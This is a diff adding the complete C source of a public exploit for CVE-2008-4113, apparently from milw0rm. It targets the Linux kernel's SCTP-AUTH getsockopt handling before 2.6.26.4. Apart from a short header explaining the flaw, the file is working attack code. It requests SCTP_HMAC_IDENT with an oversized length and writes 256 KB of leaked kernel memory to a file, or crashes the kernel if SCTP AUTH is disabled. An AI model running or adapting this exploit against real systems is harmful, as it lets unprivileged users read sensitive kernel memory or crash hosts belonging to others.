@@ -1,0 +1,92 @@
+/*
+ * cve-2008-4113.c
+ *
+ * Linux Kernel < 2.6.26.4 SCTP kernel memory disclosure
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ * 
+ * Information:
+ *
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4113
+ *
+ *   The sctp_getsockopt_hmac_ident function in net/sctp/socket.c in the Stream
+ *   Control Transmission Protocol (sctp) implementation in the Linux kernel 
+ *   before 2.6.26.4, when the SCTP-AUTH extension is enabled, relies on an 
+ *   untrusted length value to limit copying of data from kernel memory, which 
+ *   allows local users to obtain sensitive information via a crafted 
+ *   SCTP_HMAC_IDENT IOCTL request involving the sctp_getsockopt function.
+ *
+ * Notes:
+ *
+ *   If SCTP AUTH is enabled (net.sctp.auth_enable = 1), this exploit allow an 
+ *   unprivileged user to dump an arbitrary amount (DUMP_SIZE) of kernel memory
+ *   out to a file (DUMP_FILE). If SCTP AUTH is not enabled, the exploit will 
+ *   trigger a kernel OOPS.
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/sctp.h>
+
+#ifndef SCTP_HMAC_IDENT
+#define SCTP_HMAC_IDENT 22
+#endif
+
+#define DUMP_SIZE 256*1024
+#define DUMP_FILE "mem.dump"
+
+int
+main(int argc, char **argv)
+{
+	int ret, sock;
+	FILE *dumpfile;
+	char *memdump, *err;
+	socklen_t memlen = DUMP_SIZE;
+
+	memdump = malloc(DUMP_SIZE);
+	if (!memdump) {
+		err = "malloc(3) failed";
+		printf("[-] Error: %s (%s)\n", err, strerror(errno));
+		return 1;
+	}
+	memset(memdump, 0, DUMP_SIZE);
+
+	printf("[+] creating IPPROTO_SCTP socket\n");
+
+	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_SCTP);
+	if (sock == -1) {
+		err = "socket(2) failed";
+		printf("[-] Error: %s (%s)\n", err, strerror(errno));
+		return 1;
+	}
+
+	printf("[+] getting socket option SCTP_HMAC_IDENT with length of %d\n", memlen);
+
+	ret = getsockopt(sock, SOL_SCTP, SCTP_HMAC_IDENT, memdump, &memlen);
+	if (ret == -1) {
+		err = "getsockopt(2) failed";
+		printf("[-] Error: %s (%s)\n", err, strerror(errno));
+		return 1;
+	}
+
+	printf("[+] dumping %d bytes of kernel memory to %s\n", memlen, DUMP_FILE);
+
+	dumpfile = fopen(DUMP_FILE, "wb");
+	if (!dumpfile) {
+		err = "fopen(3) failed";
+		printf("[-] Error: %s (%s)\n", err, strerror(errno));
+		return 1;
+	}
+	fwrite(memdump, 1, memlen, dumpfile);
+	fclose(dumpfile);
+	
+	printf("[+] done.\n");
+
+	return 0;
+}
+
+// milw0rm.com [2008-12-29]
